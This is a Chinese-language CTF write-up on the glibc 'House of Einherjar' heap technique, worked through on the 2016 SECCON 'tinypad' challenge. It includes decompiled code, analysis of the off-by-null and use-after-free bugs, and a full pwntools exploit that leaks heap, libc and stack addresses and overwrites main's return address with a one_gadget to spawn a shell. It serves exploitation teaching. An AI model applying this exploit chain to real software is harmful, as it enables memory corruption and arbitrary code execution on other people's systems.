# House of einherjar
## 原理
释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。

free 函数中的后向合并核心操作如下


        /* consolidate backward */
        if (!prev_inuse(p)) {
            prevsize = prev_size(p);
            size += prevsize;
            p = chunk_at_offset(p, -((long) prevsize));
            unlink(av, p, bck, fwd);
        }
>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))
![在这里插入图片描述](https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png)


## 思路1：两个chunk通过后向unlink直接实现任意地址写
假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。
## 思路2：三个chunk通过后向unlink实现double free

	chunk_0  0xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache 
	chunk_1  0x18    # 堆块大小以8结尾，保证off by null可以覆盖到下一个堆块的prev_inuse
	chunk_2  0xD0    # 堆块大小的最后一个字节必须为00，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小
	chunk_3  0x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中


申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。

## 例题：
### 2016_seccon_tinypad
![在这里插入图片描述](https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png)
![](https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png)
运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk
![在这里插入图片描述](https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png)


#### ida伪代码
主函数

	int __cdecl main(int argc, const char **argv, const char **envp)
	{
	  __int64 v3; // rax
	  int choice; // eax
	  int v5; // eax
	  __int64 v6; // rax
	  size_t v7; // rax
	  int c; // [rsp+4h] [rbp-1Ch] BYREF
	  int i; // [rsp+8h] [rbp-18h]
	  int index; // [rsp+Ch] [rbp-14h]
	  int v12; // [rsp+10h] [rbp-10h]
	  int v13; // [rsp+14h] [rbp-Ch]
	  unsigned __int64 v14; // [rsp+18h] [rbp-8h]
	
	  v14 = __readfsqword(0x28u);
	  v12 = 0;
	  write_n(&unk_4019F0, 1uLL);
	  write_n(
	    "  ============================================================================\n"
	    "// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n"
	    "||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n"
	    "||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n"
	    "||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n"
	    "\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n"
	    "  ============================================================================\n",
	    563uLL);
	  write_n(&unk_4019F0, 1uLL);
	  do
	  {
	    for ( i = 0; i <= 3; ++i )
	    {
	      LOBYTE(c) = i + 49;
	      writeln("+------------------------------------------------------------------------------+\n", 81LL);
	      write_n(" #   INDEX: ", 12uLL);
	      writeln(&c, 1LL);
	      write_n(" # CONTENT: ", 12uLL);
	      if ( *&tinypad[16 * i + 264] )
	      {
	        v3 = strlen(*&tinypad[16 * i + 264]);
	        writeln(*&tinypad[16 * i + 264], v3);
	      }
	      writeln(&unk_4019F0, 1LL);
	    }
	    index = 0;
	    choice = getcmd();
	    v12 = choice;
	    if ( choice == 68 )
	    {
	      write_n("(INDEX)>>> ", 11uLL);
	      index = read_int();
	      if ( index <= 0 || index > 4 )            // 只能申请四个chunk
	                                                // 
	      {
	LABEL_29:
	        writeln("Invalid index", 13LL);
	        continue;
	      }
	      if ( !*&tinypad[16 * index + 240] )
	      {
	LABEL_31:
	        writeln("Not used", 8LL);
	        continue;
	      }
	      free(*&tinypad[16 * index + 248]);
	      *&tinypad[16 * index + 240] = 0LL;        // size置为0，头指针未置为0
	      writeln("\nDeleted.", 9LL);      					//uaf
	    }
	    else if ( choice > 0x44 )
	    {
	      if ( choice != 0x45 )
	      {
	        if ( choice == 81 )
	          continue;
	LABEL_41:
	        writeln("No such a command", 17LL);
	        continue;
	      }
	      write_n("(INDEX)>>> ", 11uLL);
	      index = read_int();
	      if ( index <= 0 || index > 4 )
	        goto LABEL_29;
	      if ( !*&tinypad[16 * index + 240] )
	        goto LABEL_31;
	      c = 48;
	      strcpy(tinypad, *&tinypad[16 * index + 248]);
	      while ( toupper(c) != 89 )
	      {
	        write_n("CONTENT: ", 9uLL);
	        v6 = strlen(tinypad);
	        writeln(tinypad, v6);
	        write_n("(CONTENT)>>> ", 13uLL);
	        v7 = strlen(*&tinypad[16 * index + 248]);
	        read_until(tinypad, v7, 10u);
	        writeln("Is it OK?", 9LL);
	        write_n("(Y/n)>>> ", 9uLL);
	        read_until(&c, 1uLL, 10u);
	      }
	      strcpy(*&tinypad[16 * index + 248], tinypad);
	      writeln("\nEdited.", 8LL);
	    }
	    else
	    {
	      if ( choice != 65 )
	        goto LABEL_41;
	      while ( index <= 3 && *&tinypad[16 * index + 256] )
	        ++index;
	      if ( index == 4 )
	      {
	        writeln("No space is left.", 17LL);
	      }
	      else
	      {
	        v13 = -1;
	        write_n("(SIZE)>>> ", 10uLL);
	        v13 = read_int();
	        if ( v13 <= 0 )
	        {
	          v5 = 1;
	        }
	        else
	        {
	          v5 = v13;
	          if ( v13 > 0x100 )
	            v5 = 256;
	        }
	        v13 = v5;
	        *&tinypad[16 * index + 256] = v5;
	        *&tinypad[16 * index + 264] = malloc(v13);
	        if ( !*&tinypad[16 * index + 264] )
	        {
	          writerrln("[!] No memory is available.", 27LL);
	          exit(-1);
	        }
	        write_n("(CONTENT)>>> ", 13uLL);
	        read_until(*&tinypad[16 * index + 264], v13, 10u);
	        writeln("\nAdded.", 7LL);
	      }
	    }
	  }
	  while ( v12 != 81 );
	  return 0;
	}
####  add函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png)
	![在这里插入图片描述](https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png)

		*&tinypad[16 * index + 0x100] = v5;
        *&tinypad[16 * index + 264] = malloc(v13);
  存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针

#### edit函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png)
该edit函数调用的read_until函数存在off-by-null漏洞
#### free函数
![](https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png)
free函数存在uaf漏洞
### 思路
首先泄露libc和heap地址

利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。

这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook

	v6 = strlen(tinypad);

可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell
### 利用过程
先把前面的代码写好

	# coding=utf-8
	from pwn import*
	context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
	sh = process('./tinypad')
	libc = ELF('//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')
	
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims             :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	#定义gdb调试函数
	def dbg():
	        gdb.attach(sh)
	        pause()
	
	def add(size, content='a'):
	    sla('(CMD)>>> ','a')
	    sla('(SIZE)>>> ',str(size))
	    sla('(CONTENT)>>> ',content)
	
	
	
	def edit(idx, content):
	    sla('(CMD)>>> ','e')
	    sla('(INDEX)>>> ',str(idx))
	    sla('(CONTENT)>>> ',content)
	    sla('Is it OK?\n','Y')
	   
	
	
	def free(idx):
	    sla('(CMD)>>> ','d')
	    sla('(INDEX)>>> ',str(idx))
	
	def exit():
	    sla('(CMD)>>> ','Q')

先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78

	add(0x100)
	add(0x100)
	add(0x100)
	add(0x100)
	
	free(3)
	free(1)
	ru('INDEX: 1')
	ru('CONTENT: ')
	heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2
	ru('INDEX: 3')
	ru('CONTENT: ')
	libcbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) - 0x3C4B78
	environ = libc.sym['environ']+libcbase
	lg('heapbase',heapbase)
	lg('libcbase',libcbase)
	
	dbg()
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png)![在这里插入图片描述](https://img-blog.csdnimg.cn/e4a80c077a944e0aaf438d8d41d87caf.png)


在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。

	add(0x100)
	add(0x100)
	
	#dbg()
	
	#四个chunk与top chunk合并
	free(4)
	free(1)
	free(2)
	free(3)
	
	#dbg()
	#empty now 
	
	add(0x100,'a'*0x100)
	edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))
	
	#dbg()


	free(1)


	add(0x10) #1
	add(0xf0) #2
	add(0x10) #3
	add(0x100,'a'*0x100) #4
之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk	

	#edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))

	
	free(1)
	target = heapbase+0x20-0x602070
	add(0x18,b'a'*0x10+p64(target)) #1
	
	dbg()

 
![在这里插入图片描述](https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png)
再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将

	free(2)

	edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png)


再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk  size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）

	add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))
	ru('INDEX: 1')
	ru('CONTENT: ')
	stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))
	target =  -0xF0 + stack 
	lg('stack',stack)
	lg('target',target)
	#0x7fc7dd85ff38 <environ>:	0x00007ffc91b85d58	0x0000000000000000
	#1e:00f0│       0x7ffc91b85c68 —▸ 0x7fc7dd4b9830 (__libc_start_main+240) ◂— mov    edi, eax
	#  0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png)

泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target =  -0xF0 + stack
![在这里插入图片描述](https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png)
刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve("/bin/sh\x00")，再退出程序，获得shell

	edit(2,p64(target))
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
	shell = one_gadget[0] + libcbase
	edit(1,p64(shell))
	exit()
	itr()
![在这里插入图片描述](https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png)

### exp
	# coding=utf-8
	from pwn import*
	context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
	sh = process('./tinypad')
	libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')
	
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims             :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	#定义gdb调试函数
	def dbg():
	        gdb.attach(sh)
	        pause()
	
	def add(size, content='a'):
	    sla('(CMD)>>> ','a')
	    sla('(SIZE)>>> ',str(size))
	    sla('(CONTENT)>>> ',content)
	
	
	
	def edit(idx, content):
	    sla('(CMD)>>> ','e')
	    sla('(INDEX)>>> ',str(idx))
	    sla('(CONTENT)>>> ',content)
	    sla('Is it OK?\n','Y')
	   
	
	
	def free(idx):
	    sla('(CMD)>>> ','d')
	    sla('(INDEX)>>> ',str(idx))
	
	def exit():
	    sla('(CMD)>>> ','Q')
		 
	add(0x100)
	add(0x100)
	add(0x100)
	add(0x100)
	
	free(3)
	free(1)
	ru('INDEX: 1')
	ru('CONTENT: ')
	heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2
	ru('INDEX: 3')
	ru('CONTENT: ')
	main_arena_88 = u64(ru('\n')[:-1].ljust(8,b'\x00')) 
	libcbase = main_arena_88-0x3C4B78
	environ = libc.sym['environ']+libcbase
	lg('heapbase',heapbase)
	lg('libcbase',libcbase)
	
	#dbg()
	
	add(0x100)
	add(0x100)
	
	#dbg()
	
	#四个chunk与top chunk合并
	free(4)
	free(1)
	free(2)
	free(3)
	
	#dbg()
	#empty now 
	
	add(0x100,'a'*0x100)
	edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))
	
	#dbg()
	
	free(1)

	add(0x10) #1
	add(0xf0) #2
	add(0x10) #3
	add(0x100,'a'*0x100) #4
	
	#dbg()
	
	free(1)
	
	#dbg()
	
	target = heapbase+0x20-0x602070
	add(0x18,b'a'*0x10+p64(target)) #1
	
	
	free(2)
	
	#dbg()
	
	edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)
	
	#dbg()
	
	add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))
	ru('INDEX: 1')
	ru('CONTENT: ')
	stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))
	target =  -0xF0 + stack 
	lg('stack',stack)
	lg('target',target)
	#0x7f825ab56f38 <environ>:	0x00007ffe282d8c28	0x0000000000000000
	#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax
	#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0
	#dbg()
	
	edit(2,p64(target))
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
	shell = one_gadget[0] + libcbase
	edit(1,p64(shell))
	exit()
	 
	itr()

 